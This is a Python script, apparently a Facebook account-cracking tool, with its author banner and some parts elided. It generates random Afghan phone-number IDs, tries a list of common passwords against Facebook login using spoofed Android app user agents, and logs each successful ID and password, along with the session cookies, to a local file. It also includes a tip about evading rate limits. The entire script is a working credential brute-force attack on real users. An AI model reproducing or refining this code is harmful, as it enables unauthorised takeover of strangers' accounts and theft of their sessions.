...
def __banner___():
    os.system('clear')
    print(f"""\033[1;36m     AAA   RRRRRR  IIIII FFFFFFF IIIII NN   NN 
    AAAAA  RR   RR  III  FF       III  NNN  NN 
   AA   AA RRRRRR   III  FFFF     III  NN N NN 
   AAAAAAA RR  RR   III  FF       III  NN  NNN 
   AA   AA RR   RR IIIII FF      IIIII NN   NN 
\033[1;37m    ┌───────────────────────────────────────┐
 \033[1;37m   │ [>] AUTHOR   : ALONE             │
\033[1;37m    │ [>] GITHUB   : AFGHANBIO           │
\033[1;37m    │ [>] WHATSAPP : 93749594645        │
\033[1;37m    │ [>] VERSION  : 1.4                    │
\033[1;37m    │ [>] TYPE     :     RANDOM      │
\033[1;37m    └───────────────────────────────────────┘""")
...
def ___mix___():
    ...
    os.system('clear')
    __banner___()
    print('\033[1;37m~[•] AFG SIM CODE \033[1;37m9378    9377ــ      ]')
    code = input('\033[1;36m~[+] SELECT : ')
#.     os.system('xdg-open https://github.com/ARIFIN-143')
    print('\033[1;37m~[•] EXAMPLE : 1000,5000,10000,15000,20000]')
    limit = int(input('\033[1;36m~[+] LIMIT : '))
#.     os.system('xdg-open https://youtube.com/')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        id.append(nmp)
    with ThreadPool(max_workers=30) as ___mal___:
        os.system('clear')
        __banner___()
        tl = str(len(user)) 
        print('\033[1;37m[•]\033[1;37m COUNTRY\033[1;37m      : '+desh)
     #   print('\033[1;92m┣━[•]\033[1;92m USER NAME \033[1;97m : '+jsn)
        print(f"\033[1;37m[•]\033[1;37m TOTAL CRACK \033[1;37m : {limit}")
        print('\033[1;37m[•]\033[1;37m SIM CODE\033[1;37m     : '+code)
        print('\033[1;37m[•]\033[1;37m USE AIRPLANE MOOD FOR MORE OK IDZ')
        __farjana__()
        for love in id:
           ...
           bu = ids[:8] #1st 8digit
           pwv = [love,au,bu,"@#@#@#","@@@###","afghanistan","janjan","kabul123","Afghan123"]
...
def uaa():
    ...
    app_vercode = str(random.randint(000000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {and_mod} Build/QP1A.{app_uld})  [FBAN/FB4A;FBAV/59.0.0.15.313;FBBV/20097173;FBDM/'+'{density=2.0,width=720,height=1280}'+';FBLC/en_GB;FBCR/Sunrise;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G800F;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]'
    return ua
def uaa():
...
def ___mixt___(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\033[1;90m[\033[1;92mSEARCING\033[1;90m]-[\033[1;93m{loop}\033[1;97m/\033[1;93m{str(len(id))}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\33[1;92m[ALONE-OK] '+ids+' | '+pas+'\033[1;92m')
                print(f"\r\33[1;36m=[🥰]=COOKIES: {kuki}\33[1;36m")
                oks.append(ids)
                open('/sdcard/ALONE-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
